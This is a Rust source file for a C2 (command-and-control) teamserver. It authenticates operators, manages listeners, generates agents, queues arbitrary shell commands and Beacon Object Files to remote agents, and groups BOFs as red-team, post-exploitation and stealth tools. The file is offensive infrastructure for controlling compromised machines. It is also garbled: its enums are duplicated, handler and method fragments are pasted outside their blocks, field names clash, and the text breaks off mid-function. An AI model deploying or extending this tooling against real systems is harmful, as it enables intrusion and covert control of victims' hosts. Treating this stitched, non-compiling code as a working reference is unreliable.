// src/server.rs - Complete BOF Integration
use std::sync::{Arc, Mutex};
use std::net::SocketAddr;
use std::collections::HashMap;
use std::fs::File;
use std::io::Write;
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::mpsc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use serde::{Serialize, Deserialize};
use clap::Parser;
use log::{info, error, warn};

// Import your existing modules
mod listener;
mod agent;
mod bof;
mod crypto;
mod models;
mod utils;

use crate::listener::{Listener, ListenerConfig, get_all_agents, add_task_for_agent, set_result_callback};
use agent::{AgentGenerator, AgentConfig};
use bof::{BofExecutor, BofArgs};
use bof::integration::{BofSystem, BofTask, BofExecutionResult, BofMetadata, BofExecutionStatus, BofParser, BofCollections};
use models::agent::Agent;

use crate::bof::{BofManager, BofCommandParser, BofMetadata};
use std::collections::HashMap;

// Command-line arguments
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// IP address to bind the server to
    #[arg(default_value = "0.0.0.0")]
    ip_address: String,

    /// Password for authentication
    #[arg(required = true)]
    password: String,

    /// Port to listen on
    #[arg(short, long, default_value_t = 50050)]
    port: u16,
}

// Complete message types with BOF support
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ClientMessage {
    // Authentication
    Authenticate { password: String },
    
    // Listener management
    AddListener { config: ListenerConfig },
    StartListener { id: usize },
    StopListener { id: usize },
    GetListeners,
    
    // Agent management
    GenerateAgent { config: AgentConfig },
    GetAgents,
    ExecuteCommand { agent_id: String, command: String },
    
    // Legacy BOF support
    ExecuteBof { bof_path: String, args: String, target: String },
    
    // Enhanced BOF support
    ListBofs,
    GetBofInfo { bof_name: String },
    ExecuteBofOnAgent { bof_name: String, args: String, agent_id: String },
    ExecuteBofLocal { bof_name: String, args: String },
    GetBofTasks,
    CancelBofTask { task_id: String },
    CleanupBofTasks,
    LoadBofFile { file_path: String },
    GetBofCollections,
    ReloadBofLibrary,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ServerMessage {
    // Authentication
    AuthResult { success: bool, message: String },
    
    // Listener updates
    ListenersUpdate { listeners: Vec<ListenerInfo> },
    
    // Agent updates
    AgentsUpdate { agents: Vec<Agent> },
    CommandResult { agent_id: String, task_id: String, command: String, output: String, success: bool },
    
    // BOF responses
    BofsListed { bofs: Vec<BofMetadata> },
    BofInfo { metadata: BofMetadata, help_text: String },
    BofTaskQueued { task_id: String, agent_id: String },
    BofExecutionResult { task_id: String, result: BofExecutionResult },
    BofTasks { tasks: Vec<BofTask> },
    BofTaskCancelled { task_id: String },
    BofTasksCleanedUp { count: usize },
    BofFileLoaded { bof_name: String },
    BofCollections { collections: HashMap<String, Vec<String>> },
    BofLibraryReloaded { count: usize },
    BofError { message: String },
    
    // General responses
    Error { message: String },
    Success { message: String },
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ListenerInfo {
    pub id: usize,
    pub config: ListenerConfig,
    pub running: bool,
}

// Enhanced server state with BOF support
struct ServerState {
    listeners: Vec<Listener>,
    agent_generator: AgentGenerator,
    bof_manager: BofManager,  // CHANGED: Replace bof_executor with bof_manager
    clients: HashMap<String, mpsc::Sender<ServerMessage>>,
    password: String,
}

impl ServerState {
    fn new(password: String) -> Self {
        ServerState {
            listeners: Vec::new(),
            agent_generator: AgentGenerator::new(),
            bof_manager: BofManager::new(),  // CHANGED: Initialize BOF manager instead of executor
            clients: HashMap::new(),
            password,
        }
    }
    fn execute_bof(&mut self, bof_path: &str, args: &str, target: &str) -> Result<(), String> {
        // Extract BOF name from path
        let bof_name = std::path::Path::new(bof_path)
            .file_stem()
            .and_then(|s| s.to_str())
            .unwrap_or(bof_path);

        println!("🎯 BOF execution request: {} with args '{}' on target '{}'", bof_name, args, target);

        if target == "local" {
            // Local execution for testing
            match self.bof_manager.execute_bof(bof_name, args, target) {
                Ok(context) => {
                    println!("✅ Local BOF execution successful");
                    let output = String::from_utf8_lossy(&context.beacon_output);
                    if !output.is_empty() {
                        println!("Output: {}", output);
                    }
                    Ok(())
                },
                Err(e) => {
                    eprintln!("❌ Local BOF execution failed: {}", e);
                    Err(e.to_string())
                }
            }
        } else {
            // Remote execution - queue BOF command for agent
            let bof_command = format!("bof {} {}", bof_name, args);
            add_task_for_agent(target, bof_command);
            println!("📋 BOF task queued for agent: {}", target);
            Ok(())
        }
    }

    fn execute_bof_by_name(&mut self, bof_name: &str, args: &str, target: &str) -> Result<String, String> {
        println!("🎯 Enhanced BOF execution: {} with args '{}' on target '{}'", bof_name, args, target);

        if target == "local" {
            // Local execution for testing
            match self.bof_manager.execute_bof(bof_name, args, target) {
                Ok(context) => {
                    println!("✅ Local BOF execution successful");
                    let output = String::from_utf8_lossy(&context.beacon_output);
                    if !output.is_empty() {
                        println!("Output: {}", output);
                    }
                    Ok(format!("Local BOF '{}' executed successfully in {}ms", bof_name, context.execution_time_ms))
                },
                Err(e) => {
                    eprintln!("❌ Local BOF execution failed: {}", e);
                    Err(e.to_string())
                }
            }
        } else {
            // Remote execution - queue BOF command for agent
            let bof_command = format!("bof {} {}", bof_name, args);
            add_task_for_agent(target, bof_command);
            println!("📋 BOF task queued for agent: {}", target);
            Ok(format!("BOF '{}' queued for execution on agent '{}'", bof_name, target))
        }
    }


    #[derive(Serialize, Deserialize, Debug, Clone)]
enum ClientMessage {
    Authenticate { password: String },
    AddListener { config: ListenerConfig },
    StartListener { id: usize },
    StopListener { id: usize },
    GetListeners,
    GenerateAgent { config: AgentConfig },
    GetAgents,
    ExecuteBof { bof_path: String, args: String, target: String },
    ExecuteCommand { agent_id: String, command: String },
    
    // ADD these new BOF messages:
    ExecuteBofByName { bof_name: String, args: String, target: String },
    GetBofLibrary,
    GetBofHelp { bof_name: String },
    SearchBofs { query: String },
    GetBofStats,
}

// ADD these new message types to your existing ServerMessage enum:
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ServerMessage {
    AuthResult { success: bool, message: String },
    ListenersUpdate { listeners: Vec<ListenerInfo> },
    AgentsUpdate { agents: Vec<Agent> },
    CommandResult { agent_id: String, task_id: String, command: String, output: String, success: bool },
    Error { message: String },
    Success { message: String },
    
    // ADD these new BOF messages:
    BofLibrary { bofs: Vec<serde_json::Value> },
    BofHelp { bof_name: String, help_text: String },
    BofSearchResults { results: Vec<serde_json::Value> },
    BofStats { stats: HashMap<String, u64> },
}

// ADD these new message handlers to your handle_client function (inside the match statement):

            // Enhanced command execution with BOF parsing
            ClientMessage::ExecuteCommand { agent_id, command } => {
                // Check if this is a BOF command
                if let Some((bof_name, args)) = BofCommandParser::parse_bof_command(&command) {
                    info!("🎯 Parsed BOF command: {} with args '{}'", bof_name, args);
                    
                    let result = {
                        let mut state = state.lock().unwrap();
                        state.execute_bof_by_name(&bof_name, &args, &agent_id)
                    };
                    
                    let response = match result {
                        Ok(message) => ServerMessage::Success { message },
                        Err(e) => ServerMessage::Error { 
                            message: format!("❌ Failed to queue BOF: {}", e) 
                        },
                    };
                    
                    if let Err(e) = client_tx.send(response).await {
                        error!("❌ Failed to send response to {}: {}", addr, e);
                        break;
                    }
                } else {
                    // Regular command execution (existing code)
                    println!("🎯 SERVER: Execute command '{}' for agent '{}'", command, agent_id);
                    
                    let task_id = add_task_for_agent(&agent_id, command.clone());
                    println!("📋 SERVER: Created task {} for agent {}", task_id, agent_id);
                    
                    let response = ServerMessage::Success { 
                        message: format!("📤 Command '{}' queued for agent {} (Task: {})", command, agent_id, task_id)
                    };
                    
                    if let Err(e) = client_tx.send(response).await {
                        error!("❌ Failed to send response to {}: {}", addr, e);
                        break;
                    }
                }
            },

            ClientMessage::ExecuteBofByName { bof_name, args, target } => {
                let result = {
                    let mut state = state.lock().unwrap();
                    state.execute_bof_by_name(&bof_name, &args, &target)
                };
                
                let response = match result {
                    Ok(message) => ServerMessage::Success { message },
                    Err(e) => ServerMessage::Error { 
                        message: format!("❌ Failed to execute BOF '{}': {}", bof_name, e) 
                    },
                };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("❌ Failed to send response to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::GetBofLibrary => {
                let bofs = {
                    let state = state.lock().unwrap();
                    state.get_bof_library()
                };
                
                let response = ServerMessage::BofLibrary { bofs };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("❌ Failed to send BOF library to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::GetBofHelp { bof_name } => {
                let help_text = {
                    let state = state.lock().unwrap();
                    state.get_bof_help(&bof_name)
                };
                
                let response = ServerMessage::BofHelp { 
                    bof_name: bof_name.clone(), 
                    help_text 
                };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("❌ Failed to send BOF help to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::SearchBofs { query } => {
                let results = {
                    let state = state.lock().unwrap();
                    state.search_bofs(&query)
                };
                
                let response = ServerMessage::BofSearchResults { results };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("❌ Failed to send BOF search results to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::GetBofStats => {
                let stats = {
                    let state = state.lock().unwrap();
                    state.get_bof_stats()
                };
                
                let response = ServerMessage::BofStats { stats };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("❌ Failed to send BOF stats to {}: {}", addr, e);
                    break;
                }
            },
            
    /// Get BOF library information
    fn get_bof_library(&self) -> Vec<serde_json::Value> {
        let bofs = self.bof_manager.list_bofs();
        bofs.into_iter()
            .map(|bof| serde_json::json!({
                "name": bof.name,
                "description": bof.description,
                "author": bof.author,
                "version": bof.version,
                "opsec_level": bof.opsec_level,
                "tactics": bof.tactics,
                "techniques": bof.techniques,
                "execution_time_estimate": bof.execution_time_estimate,
                "file_path": bof.file_path,
                "usage_examples": bof.usage_examples
            }))
            .collect()
    }

    /// Get BOF help text
    fn get_bof_help(&self, bof_name: &str) -> String {
        if let Some(metadata) = self.bof_manager.get_bof(bof_name) {
            BofCommandParser::generate_help_text(metadata)
        } else {
            format!("BOF '{}' not found in library", bof_name)
        }
    }

    /// Search BOFs by query
    fn search_bofs(&self, query: &str) -> Vec<serde_json::Value> {
        let results = self.bof_manager.search_bofs(query);
        results.into_iter()
            .map(|bof| serde_json::json!({
                "name": bof.name,
                "description": bof.description,
                "author": bof.author,
                "opsec_level": bof.opsec_level,
                "tactics": bof.tactics,
                "techniques": bof.techniques
            }))
            .collect()
    }

    /// Get BOF execution statistics
    fn get_bof_stats(&self) -> HashMap<String, u64> {
        self.bof_manager.get_stats()
    }
}

    /// Get BOF library information
    fn get_bof_library(&self) -> Vec<serde_json::Value> {
        let bofs = self.bof_manager.list_bofs();
        bofs.into_iter()
            .map(|bof| serde_json::json!({
                "name": bof.name,
                "description": bof.description,
                "author": bof.author,
                "version": bof.version,
                "opsec_level": bof.opsec_level,
                "tactics": bof.tactics,
                "techniques": bof.techniques,
                "execution_time_estimate": bof.execution_time_estimate,
                "file_path": bof.file_path,
                "usage_examples": bof.usage_examples
            }))
            .collect()
    }

    /// Get BOF help text
    fn get_bof_help(&self, bof_name: &str) -> String {
        if let Some(metadata) = self.bof_manager.get_bof(bof_name) {
            BofCommandParser::generate_help_text(metadata)
        } else {
            format!("BOF '{}' not found in library", bof_name)
        }
    }

    /// Search BOFs by query
    fn search_bofs(&self, query: &str) -> Vec<serde_json::Value> {
        let results = self.bof_manager.search_bofs(query);
        results.into_iter()
            .map(|bof| serde_json::json!({
                "name": bof.name,
                "description": bof.description,
                "author": bof.author,
                "opsec_level": bof.opsec_level,
                "tactics": bof.tactics,
                "techniques": bof.techniques
            }))
            .collect()
    }

    /// Get BOF execution statistics
    fn get_bof_stats(&self) -> HashMap<String, u64> {
        self.bof_manager.get_stats()
    }
        // Initialize BOF system
        let mut bof_system = BofSystem::new();
        match bof_system.initialize_default_bofs() {
            Ok(_) => {
                println!("✅ BOF system initialized successfully");
                let available_bofs = bof_system.list_available_bofs();
                println!("📚 Loaded {} BOFs:", available_bofs.len());
                for bof in &available_bofs {
                    println!("  • {} - {} ({})", bof.name, bof.description, bof.architecture);
                }
            },
            Err(e) => {
                eprintln!("⚠️ Failed to initialize BOF system: {}", e);
            }
        }

        ServerState {
            listeners: Vec::new(),
            agent_generator: AgentGenerator::new(),
            bof_executor: BofExecutor::new(),
            bof_system,
            clients: HashMap::new(),
            password,
        }
    }

    // Existing methods
    fn get_listener_info(&self) -> Vec<ListenerInfo> {
        self.listeners
            .iter()
            .enumerate()
            .map(|(id, listener)| ListenerInfo {
                id,
                config: listener.config.clone(),
                running: listener.is_running(),
            })
            .collect()
    }

    fn add_listener(&mut self, config: ListenerConfig) -> Result<(), String> {
        let listener = Listener::new(config);
        self.listeners.push(listener);
        Ok(())
    }

    fn start_listener(&mut self, id: usize) -> Result<(), String> {
        if id >= self.listeners.len() {
            return Err("Invalid listener ID".into());
        }
        self.listeners[id].start().map_err(|e| e.to_string())
    }

    fn stop_listener(&mut self, id: usize) -> Result<(), String> {
        if id >= self.listeners.len() {
            return Err("Invalid listener ID".into());
        }
        self.listeners[id].stop().map_err(|e| e.to_string())
    }

    fn generate_agent(&mut self, config: AgentConfig) -> Result<(), String> {
        self.agent_generator.generate(config).map_err(|e| e.to_string())
    }

    // BOF-specific methods
    fn handle_list_bofs(&self) -> Vec<BofMetadata> {
        self.bof_system.list_available_bofs()
    }

    fn handle_get_bof_info(&self, bof_name: &str) -> Option<(BofMetadata, String)> {
        if let Some(metadata) = self.bof_system.get_bof_metadata(bof_name) {
            let help_text = BofParser::generate_help_text(&metadata);
            Some((metadata, help_text))
        } else {
            None
        }
    }

    fn handle_execute_bof_on_agent(&self, bof_name: &str, args: &str, agent_id: &str) -> Result<String, String> {
        println!("🎯 SERVER: Executing BOF '{}' on agent '{}' with args: '{}'", bof_name, agent_id, args);
        
        // Validate BOF exists
        if self.bof_system.get_bof_metadata(bof_name).is_none() {
            return Err(format!("BOF '{}' not found", bof_name));
        }
        
        // Create BOF command for agent
        let bof_command = if args.trim().is_empty() {
            format!("bof {}", bof_name)
        } else {
            format!("bof {} {}", bof_name, args)
        };
        
        // Queue task for agent through existing system
        let task_id = add_task_for_agent(agent_id, bof_command);
        
        println!("📋 SERVER: BOF task '{}' queued for agent '{}'", task_id, agent_id);
        Ok(task_id)
    }

    fn handle_execute_bof_local(&self, bof_name: &str, args: &str) -> Result<BofExecutionResult, String> {
        println!("🧪 SERVER: Executing BOF '{}' locally with args: '{}'", bof_name, args);
        self.bof_system.execute_bof_local(bof_name, args)
    }

    fn handle_get_bof_tasks(&self) -> Vec<BofTask> {
        self.bof_system.get_active_tasks()
    }

    fn handle_cleanup_bof_tasks(&self) -> usize {
        let before = self.bof_system.get_active_tasks().len();
        self.bof_system.cleanup_completed_tasks();
        let after = self.bof_system.get_active_tasks().len();
        before - after
    }

    fn handle_get_bof_collections(&self) -> HashMap<String, Vec<String>> {
        let mut collections = HashMap::new();
        collections.insert("Red Team".to_string(), 
            BofCollections::red_team_bofs().iter().map(|s| s.to_string()).collect());
        collections.insert("Reconnaissance".to_string(), 
            BofCollections::reconnaissance_bofs().iter().map(|s| s.to_string()).collect());
        collections.insert("Post-Exploitation".to_string(), 
            BofCollections::post_exploitation_bofs().iter().map(|s| s.to_string()).collect());
        collections.insert("Stealth".to_string(), 
            BofCollections::stealth_bofs().iter().map(|s| s.to_string()).collect());
        collections
    }

    fn handle_load_bof_file(&mut self, file_path: &str) -> Result<String, String> {
        println!("📦 SERVER: Loading BOF file: {}", file_path);
        match self.bof_system.executor_mut().load_bof(file_path) {
            Ok(bof_name) => {
                println!("✅ SERVER: BOF file loaded: {} -> {}", file_path, bof_name);
                Ok(bof_name)
            },
            Err(e) => {
                eprintln!("❌ SERVER: Failed to load BOF file {}: {}", file_path, e);
                Err(format!("Failed to load BOF: {}", e))
            }
        }
    }

    fn handle_reload_bof_library(&mut self) -> Result<usize, String> {
        println!("🔄 SERVER: Reloading BOF library...");
        match self.bof_system.initialize_default_bofs() {
            Ok(_) => {
                let count = self.bof_system.list_available_bofs().len();
                println!("✅ SERVER: BOF library reloaded with {} BOFs", count);
                Ok(count)
            },
            Err(e) => {
                eprintln!("❌ SERVER: Failed to reload BOF library: {}", e);
                Err(format!("Failed to reload BOF library: {}", e))
            }
        }
    }

    fn handle_cancel_bof_task(&self, task_id: &str) -> Result<(), String> {
        // In a real implementation, you'd cancel the task
        println!("🚫 SERVER: Cancelling BOF task: {}", task_id);
        Ok(())
    }

    fn get_client_senders(&self) -> Vec<mpsc::Sender<ServerMessage>> {
        self.clients.values().cloned().collect()
    }
}

// Enhanced client handler with comprehensive BOF support
async fn handle_client(
    stream: TcpStream, 
    addr: SocketAddr,
    state: Arc<Mutex<ServerState>>,
) {
    info!("🔗 New client connected: {}", addr);

    let (client_tx, mut client_rx) = mpsc::channel::<ServerMessage>(1000);
    let mut buffer = [0u8; 8192];
    let mut authenticated = false;

    // Add client to server state
    {
        let mut state = state.lock().unwrap();
        state.clients.insert(addr.to_string(), client_tx.clone());
    }

    // Set up callback for command results (enhanced for BOF)
    let client_tx_clone = client_tx.clone();
    set_result_callback(move |agent_id, task_id, command, output, success| {
        println!("📡 SERVER: Callback received result for agent {}", agent_id);
        println!("   Task: {}", task_id);
        println!("   Command: {}", command);
        println!("   Success: {}", success);
        
        // Check if this is a BOF command
        if command.starts_with("bof ") {
            println!("🔥 SERVER: BOF command result detected");
            
            // Extract BOF name
            let parts: Vec<&str> = command.split_whitespace().collect();
            if parts.len() >= 2 {
                let bof_name = parts[1];
                println!("🔥 SERVER: BOF '{}' completed on agent {}", bof_name, agent_id);
                
                // Create enhanced BOF result
                let bof_result = BofExecutionResult {
                    output: output.clone(),
                    error: if success { String::new() } else { "BOF execution failed".to_string() },
                    exit_code: if success { 0 } else { 1 },
                    execution_time_ms: 0, // Would be provided by agent
                    completed_at: std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs(),
                };
                
                // Send BOF-specific result
                let bof_msg = ServerMessage::BofExecutionResult {
                    task_id: task_id.clone(),
                    result: bof_result,
                };
                
                if let Err(e) = client_tx_clone.try_send(bof_msg) {
                    println!("❌ SERVER: Failed to send BOF result to client: {}", e);
                }
            }
        }
        
        // Send regular command result
        let msg = ServerMessage::CommandResult {
            agent_id,
            task_id,
            command,
            output,
            success,
        };
        
        if let Err(e) = client_tx_clone.try_send(msg) {
            println!("❌ SERVER: Failed to send result to client: {}", e);
        } else {
            println!("✅ SERVER: Successfully sent result to client");
        }
    });

    // Split the stream
    let (mut read_half, mut write_half) = stream.into_split();

    // Set up client sender task
    let addr_clone = addr;
    let receiver_task = tokio::spawn(async move {
        while let Some(msg) = client_rx.recv().await {
            let data = bincode::serialize(&msg).unwrap();
            let len = data.len() as u32;

            if write_half.write_all(&len.to_be_bytes()).await.is_err() {
                break;
            }
            if write_half.write_all(&data).await.is_err() {
                break;
            }
            if write_half.flush().await.is_err() {
                break;
            }
        }
        info!("📤 Client sender task ended for {}", addr_clone);
    });

    // Main client handling loop
    loop {
        // Read message length
        let mut len_bytes = [0u8; 4];
        match read_half.read_exact(&mut len_bytes).await {
            Ok(_) => {},
            Err(_) => break,
        }

        let len = u32::from_be_bytes(len_bytes) as usize;
        if len > buffer.len() {
            error!("❌ Message too large from client {}", addr);
            break;
        }

        // Read message
        match read_half.read_exact(&mut buffer[0..len]).await {
            Ok(_) => {},
            Err(_) => break,
        }

        // Deserialize message
        let msg: ClientMessage = match bincode::deserialize(&buffer[0..len]) {
            Ok(msg) => msg,
            Err(e) => {
                error!("❌ Failed to deserialize message from {}: {}", addr, e);
                continue;
            }
        };

        // Handle messages
        match msg {
            ClientMessage::Authenticate { password } => {
                let (success, message, listeners_update, agents_update) = {
                    let state = state.lock().unwrap();
                    let success = password == state.password;
                    let message = if success { 
                        "✅ Authentication successful".to_string() 
                    } else { 
                        "❌ Invalid password".to_string() 
                    };
                    
                    let listeners_update = if success {
                        Some(ServerMessage::ListenersUpdate { 
                            listeners: state.get_listener_info() 
                        })
                    } else { None };
                    
                    let agents_update = if success {
                        Some(ServerMessage::AgentsUpdate { 
                            agents: get_all_agents() 
                        })
                    } else { None };
                    
                    (success, message, listeners_update, agents_update)
                };
                
                authenticated = success;
                
                if let Err(e) = client_tx.send(ServerMessage::AuthResult { success, message }).await {
                    error!("❌ Failed to send auth result to {}: {}", addr, e);
                    break;
                }
                
                if authenticated {
                    if let Some(update) = listeners_update {
                        let _ = client_tx.send(update).await;
                    }
                    if let Some(update) = agents_update {
                        let _ = client_tx.send(update).await;
                    }
                    
                    // Send initial BOF data
                    let bofs = {
                        let state = state.lock().unwrap();
                        state.handle_list_bofs()
                    };
                    let _ = client_tx.send(ServerMessage::BofsListed { bofs }).await;
                    
                    let collections = {
                        let state = state.lock().unwrap();
                        state.handle_get_bof_collections()
                    };
                    let _ = client_tx.send(ServerMessage::BofCollections { collections }).await;
                }
            },

            // Require authentication for all other messages
            _ if !authenticated => {
                let _ = client_tx.send(ServerMessage::Error { 
                    message: "❌ Not authenticated".to_string() 
                }).await;
                continue;
            },

            // Existing listener management
            ClientMessage::AddListener { config } => {
                let (result, listeners, agents, client_senders) = {
                    let mut state = state.lock().unwrap();
                    let result = state.add_listener(config);
                    (result, state.get_listener_info(), get_all_agents(), state.get_client_senders())
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { message: "✅ Listener added".to_string() },
                    Err(e) => ServerMessage::Error { message: format!("❌ Failed to add listener: {}", e) },
                };
                
                let _ = client_tx.send(response).await;
                tokio::spawn(async move {
                    for tx in client_senders {
                        let _ = tx.send(ServerMessage::ListenersUpdate { listeners: listeners.clone() }).await;
                        let _ = tx.send(ServerMessage::AgentsUpdate { agents: agents.clone() }).await;
                    }
                });
            },

            ClientMessage::StartListener { id } => {
                let (result, listeners, agents, client_senders) = {
                    let mut state = state.lock().unwrap();
                    let result = state.start_listener(id);
                    (result, state.get_listener_info(), get_all_agents(), state.get_client_senders())
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { message: format!("✅ Listener {} started", id) },
                    Err(e) => ServerMessage::Error { message: format!("❌ Failed to start listener: {}", e) },
                };
                
                let _ = client_tx.send(response).await;
                tokio::spawn(async move {
                    for tx in client_senders {
                        let _ = tx.send(ServerMessage::ListenersUpdate { listeners: listeners.clone() }).await;
                        let _ = tx.send(ServerMessage::AgentsUpdate { agents: agents.clone() }).await;
                    }
                });
            },

            ClientMessage::StopListener { id } => {
                let (result, listeners, agents, client_senders) = {
                    let mut state = state.lock().unwrap();
                    let result = state.stop_listener(id);
                    (result, state.get_listener_info(), get_all_agents(), state.get_client_senders())
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { message: format!("✅ Listener {} stopped", id) },
                    Err(e) => ServerMessage::Error { message: format!("❌ Failed to stop listener: {}", e) },
                };
                
                let _ = client_tx.send(response).await;
                tokio::spawn(async move {
                    for tx in client_senders {
                        let _ = tx.send(ServerMessage::ListenersUpdate { listeners: listeners.clone() }).await;
                        let _ = tx.send(ServerMessage::AgentsUpdate { agents: agents.clone() }).await;
                    }
                });
            },

            ClientMessage::GetListeners => {
                let listeners = {
                    let state = state.lock().unwrap();
                    state.get_listener_info()
                };
                let _ = client_tx.send(ServerMessage::ListenersUpdate { listeners }).await;
            },

            // Agent management
            ClientMessage::GenerateAgent { config } => {
                let result = {
                    let mut state = state.lock().unwrap();
                    state.generate_agent(config)
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { message: "✅ Agent generated".to_string() },
                    Err(e) => ServerMessage::Error { message: format!("❌ Failed to generate agent: {}", e) },
                };
                let _ = client_tx.send(response).await;
            },

            ClientMessage::GetAgents => {
                let agents = get_all_agents();
                let _ = client_tx.send(ServerMessage::AgentsUpdate { agents }).await;
            },

            ClientMessage::ExecuteCommand { agent_id, command } => {
                println!("🎯 SERVER: Execute command '{}' for agent '{}'", command, agent_id);
                let task_id = add_task_for_agent(&agent_id, command.clone());
                let _ = client_tx.send(ServerMessage::Success { 
                    message: format!("📤 Command queued: {}", task_id) 
                }).await;
            },

            // BOF Management
            ClientMessage::ListBofs => {
                let bofs = {
                    let state = state.lock().unwrap();
                    state.handle_list_bofs()
                };
                let _ = client_tx.send(ServerMessage::BofsListed { bofs }).await;
            },

            ClientMessage::GetBofInfo { bof_name } => {
                let info = {
                    let state = state.lock().unwrap();
                    state.handle_get_bof_info(&bof_name)
                };
                
                let response = match info {
                    Some((metadata, help_text)) => {
                        ServerMessage::BofInfo { metadata, help_text }
                    },
                    None => {
                        ServerMessage::BofError { 
                            message: format!("BOF '{}' not found", bof_name) 
                        }
                    }
                };
                let _ = client_tx.send(response).await;
            },

            ClientMessage::ExecuteBofOnAgent { bof_name, args, agent_id } => {
                let result = {
                    let state = state.lock().unwrap();
                    state.handle_execute_bof_on_agent(&bof_name, &args, &agent_id)
                };
                
                let response = match result {
                    Ok(task_id) => {
                        ServerMessage::BofTaskQueued { task_id, agent_id }
                    },
                    Err(e) => {
                        ServerMessage::BofError { message: e }
                    }
                };
                let _ = client_tx.send(response).await;
            },

            ClientMessage::ExecuteBofLocal { bof_name, args } => {
                let result = {
                    let state = state.lock().unwrap();
                    state.handle_execute_bof_local(&bof_name, &args)
                };
                
                let response = match result {
                    Ok(exec_result) => {
                        ServerMessage::BofExecutionResult { 
                            task_id: "local".to_string(), 
                            result: exec_result 
                        }
                    },
                    Err(e) => {
                        ServerMessage::BofError { message: e }
                    }
                };
                let _ = client_tx.send(response).await;
            },

            ClientMessage::GetBofTasks => {
                let tasks = {
                    let state = state.lock().unwrap();
                    state.handle_get_bof_tasks()
                };
                let _ = client_tx.send(ServerMessage::BofTasks { tasks }).await;
            },

            ClientMessage::CleanupBofTasks => {
                let count = {
                    let state = state.lock().unwrap();
                    state.handle_cleanup_bof_tasks()
                };
                let _ = client_tx.send(ServerMessage::BofTasksCleanedUp { count }).await;
            },

            ClientMessage::LoadBofFile { file_path } => {
                let result = {
                    let mut state = state.lock().unwrap();
                    state.handle_load_bof_file(&file_path)
                };
                
                let response = match result {
                    Ok(bof_name) => {
                        ServerMessage::BofFileLoaded { bof_name }
                    },
                    Err(e) => {
                        ServerMessage::BofError { message: e }
                    }
                };
                let _ = client_tx.send(response).await;
            },

            ClientMessage::GetBofCollections => {
                let collections = {
                    let state = state.lock().unwrap();
                    state.handle_get_bof_collections()
                };
                let _ = client_tx.send(ServerMessage::BofCollections { collections }).await;
            },

            ClientMessage::ReloadBofLibrary => {
                let result = {
                    let mut state = state.lock().unwrap();
                    state.handle_reload_bof_library()
                };
                
                let response = match result {
                    Ok(count) => {
                        ServerMessage::BofLibraryReloaded { count }
                    },
                    Err(e) => {
                        ServerMessage::BofError { message: e }
                    }
                };
                let _ = client_tx.send(response).await;
            },

            ClientMessage::CancelBofTask { task_id } => {
                let result = {
                    let state = state.lock().unwrap();
                    state.handle_cancel_bof_task(&task_id)
                };
                
                let response = match result {
                    Ok(_) => {
                        ServerMessage::BofTaskCancelled { task_id }
                    },
                    Err(e) => {
                        ServerMessage::BofError { message: e }
                    }
                };
                let _ = client_tx.send(response).await;
            },

            // Legacy BOF support
            ClientMessage::ExecuteBof { bof_path, args, target } => {
                let result = {
                    let mut state = state.lock().unwrap();
                    state.bof_executor.execute(&bof_path, &args, &target)
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { message: "✅ BOF executed".to_string() },
                    Err(e) => ServerMessage::Error { message: format!("❌ BOF failed: {}", e) },
                };
                let _ = client_tx.send(response).await;
            },
        }
    }

    // Cleanup
    receiver_task.abort();
    {
        let mut state = state.lock().unwrap();
        state.clients.remove(&addr.to_string());
    }
    info!("🔌 Client disconnected: {}", addr);
}

// Generate teamserver script
fn generate_teamserver_script(ip: &str, port: u16, password: &str) -> std::io::Result<()> {
    let script_content = format!(
        r#"#!/bin/bash
# Enhanced C2 Framework Teamserver Script with BOF Support

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root"
    exit 1
fi

echo "🚀 Starting Enhanced C2 Server with BOF Support"
echo "📡 Server: {}:{}"
echo "🔥 BOF System: Enabled"
echo "📚 BOF Library: ./bofs/"
echo ""

# Start the C2 server
./c2_server {} "{}" --port {}
"#,
        ip, port, ip, password, port
    );

    let mut file = File::create("teamserver")?;
    file.write_all(script_content.as_bytes())?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata("teamserver")?.permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions("teamserver", perms)?;
    }

    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Initialize logging
    env_logger::init();

    // Parse command-line arguments
    let args = Args::parse();

    // Generate teamserver script if it doesn't exist
    if !std::path::Path::new("teamserver").exists() {
        match generate_teamserver_script(&args.ip_address, args.port, &args.password) {
            Ok(_) => info!("✅ Generated teamserver script"),
            Err(e) => warn!("⚠️ Failed to generate teamserver script: {}", e),
        }
    }

    // Create enhanced server state with BOF support
    let state = Arc::new(Mutex::new(ServerState::new(args.password.clone())));

    // Display comprehensive server status
    {
        let server_state = state.lock().unwrap();
        
        println!("🚀 Enhanced C2 Server with BOF Support");
        println!("{}", "=".repeat(60));
        
        // BOF System Status
        let available_bofs = server_state.handle_list_bofs();
        println!("🔥 BOF System Status:");
        println!("📚 Available BOFs: {}", available_bofs.len());
        
        if !available_bofs.is_empty() {
            println!("📋 BOF Library:");
            for bof in &available_bofs {
                println!("  • {} - {} ({})", bof.name, bof.description, bof.architecture);
                if !bof.tactics.is_empty() {
                    println!("    Tactics: {}", bof.tactics.join(", "));
                }
            }
        }
        
        // BOF Collections
        let collections = server_state.handle_get_bof_collections();
        println!("📦 BOF Collections: {}", collections.len());
